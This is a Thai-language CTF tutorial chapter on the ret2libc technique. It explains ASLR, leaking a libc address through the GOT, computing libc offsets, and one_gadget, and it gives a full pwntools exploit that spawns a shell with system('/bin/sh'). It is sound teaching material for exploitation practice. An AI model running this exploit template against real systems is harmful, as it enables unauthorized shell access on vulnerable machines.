# บท 7 — ret2libc

เมื่อโจทย์**ไม่มี**ฟังก์ชัน win ให้ และไม่มี `system("/bin/sh")` ในโค้ด
เราต้องไปยืม `system()` กับ string `"/bin/sh"` จาก **libc** แทน

## ปัญหา: libc อยู่ที่ไหน?

libc คือ library ที่มี `system`, `printf`, `puts` ฯลฯ มันถูกโหลดเข้า
memory ตอนโปรแกรมรัน — แต่ถ้าเปิด **ASLR** ตำแหน่งของ libc จะสุ่มทุกครั้ง

```
รันครั้งที่ 1:  libc อยู่ที่ 0x7f1234500000
รันครั้งที่ 2:  libc อยู่ที่ 0x7f9876500000   ← เปลี่ยน!
```

เราจึงต้อง **leak** address จริงของ libc ตอน runtime ก่อน

## กุญแจสำคัญ: ตำแหน่งภายใน libc คงที่

แม้ base address ของ libc จะสุ่ม แต่ **ระยะห่าง (offset) ระหว่างฟังก์ชัน
ภายใน libc คงที่เสมอ** สำหรับ libc เวอร์ชันเดียวกัน

```
system อยู่ที่ base + 0x50d60   (offset คงที่)
puts   อยู่ที่ base + 0x80e50   (offset คงที่)
/bin/sh อยู่ที่ base + 0x1d8678  (offset คงที่)
```

ดังนั้น: **ถ้ารู้ address จริงของฟังก์ชันหนึ่ง → คำนวณ base → หา
address ของทุกอย่างได้**

```
base = leaked_puts - offset_ของ_puts
system = base + offset_ของ_system
```

## แผนการโจมตี (2 ขั้นตอน)

ret2libc คลาสสิกทำเป็น 2 รอบ:

**รอบที่ 1 — leak:** ให้โปรแกรม print address ของฟังก์ชันใน libc ออกมา
(เช่น เรียก `puts(puts_got)` เพื่อ leak address จริงของ puts)

**รอบที่ 2 — โจมตี:** คำนวณ base จาก leak แล้วเรียก `system("/bin/sh")`

หมายเหตุ: รอบ 1 เสร็จต้องให้โปรแกรม**กลับมารับ input อีกครั้ง** เราจึงให้
มัน return กลับไปที่ฟังก์ชัน vuln (หรือ main) หลัง leak

## Exploit เต็ม (มีไฟล์ libc)

```python
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')          # libc ที่โจทย์ให้มา
p = process('./vuln')

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]

offset = 72

# ===== รอบ 1: leak address ของ puts =====
payload = flat(
    b'A' * offset,
    p64(pop_rdi), p64(elf.got['puts']),   # RDI = address ของ puts ใน GOT
    p64(elf.plt['puts']),                 # เรียก puts(puts_got) → print address จริง
    p64(elf.symbols['vuln']),             # เสร็จแล้ว return กลับ vuln เพื่อรับ input รอบ 2
)
p.sendlineafter(b'> ', payload)

# อ่าน address ที่ leak มา (6 ไบต์ + pad ให้ครบ 8)
leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f'leaked puts: {hex(leaked_puts)}')

# ===== คำนวณ base และ address อื่นๆ =====
libc.address = leaked_puts - libc.symbols['puts']    # ตั้ง base
log.info(f'libc base: {hex(libc.address)}')

system = libc.symbols['system']
binsh  = next(libc.search(b'/bin/sh'))

# ===== รอบ 2: เรียก system("/bin/sh") =====
payload = flat(
    b'A' * offset,
    p64(ret),               # align stack (สำคัญ! กัน movaps crash)
    p64(pop_rdi), p64(binsh),
    p64(system),
)
p.sendlineafter(b'> ', payload)
p.interactive()
```

## ถ้าไม่มีไฟล์ libc?

โจทย์บางข้อไม่ให้ libc มา ต้องหาเวอร์ชันเองจาก leaked address:

### วิธี libc-database / เว็บ

leak address ของ 2 ฟังก์ชันขึ้นไป แล้วเอาไปค้นที่ **libc.blukat.me** หรือ
**libc.rip** เว็บจะบอกว่าเป็น libc เวอร์ชันไหน แล้วโหลดมาใช้

```python
# leak 2 ฟังก์ชัน
leaked_puts   = ...   # จาก puts(puts_got)
leaked_printf = ...   # จาก puts(printf_got)

# เอา leaked_puts, leaked_printf ไปค้นเว็บ
# เว็บจะให้ libc เวอร์ชันที่ตรง มาใช้แทน
```

### ใช้ one_gadget (ทางลัดเปิด shell)

`one_gadget` หา address เดียวใน libc ที่เรียกแล้วเปิด shell ได้เลย ไม่ต้อง
ตั้ง argument เอง (แต่มีเงื่อนไข constraint ที่ต้องผ่าน):

```bash
$ one_gadget libc.so.6
0x50a37 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0 && rcx == NULL
```

```python
one = libc.address + 0x50a37
payload = flat(b'A'*offset, p64(one))
```

## กับดักที่เจอบ่อย

| ปัญหา | สาเหตุ | แก้ |
|-------|--------|-----|
| crash ที่ movaps | stack ไม่ align | เพิ่ม `ret` ก่อน system |
| leak เป็นเลขแปลก | อ่านไบต์ผิด / ไม่ pad | ใช้ `.ljust(8, b'\x00')` |
| base คำนวณผิด | libc คนละเวอร์ชัน | หา libc ที่ตรงจาก leak |
| one_gadget ไม่ทำงาน | constraint ไม่ผ่าน | ลอง gadget ตัวอื่น หรือทำ system ปกติ |

---

## สรุปบทนี้

- ไม่มี win → ยืม `system("/bin/sh")` จาก libc
- offset ภายใน libc คงที่ → leak หนึ่งฟังก์ชัน = คำนวณ base ได้
- ทำ 2 รอบ: leak → กลับมา → โจมตี
- ไม่มี libc → หาเวอร์ชันจาก leak (libc.rip) หรือใช้ one_gadget
- อย่าลืม align stack ด้วย `ret`

โจทย์ฝึก: ROP Emporium **ret2libc**, picoCTF **here's a libc**, HTB pwn ระดับ easy

บทต่อไป: ROP chain — ต่อ gadget เอง →
